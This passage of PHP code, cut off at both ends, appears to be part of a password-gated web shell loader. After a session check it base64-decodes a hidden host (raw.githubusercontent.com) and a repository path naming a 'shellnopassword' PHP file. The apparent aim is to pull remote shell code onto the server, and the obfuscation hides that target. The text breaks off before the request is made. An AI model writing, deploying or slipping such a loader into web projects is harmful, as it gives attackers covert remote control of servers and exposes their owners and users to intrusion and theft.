...
$hashed_password = '$2a$12$mpzRZZukv17Zbx8O/ctYcOeJJPsrA9DfdB1S1AYD96dzUcFrC//u.'; 

if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    // Jika sudah login, lanjutkan ke URL yang dimaksud
    $host = base64_decode('cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ=='); 
    $port = 443;
    $path = base64_decode('bWFuZ29sZWgwOTgvc2hlbGxub3Bhc3N3b3JkL3JlZnMvaGVhZHMvbWFpbi9hbGZmZmZmZi5waHA='); 
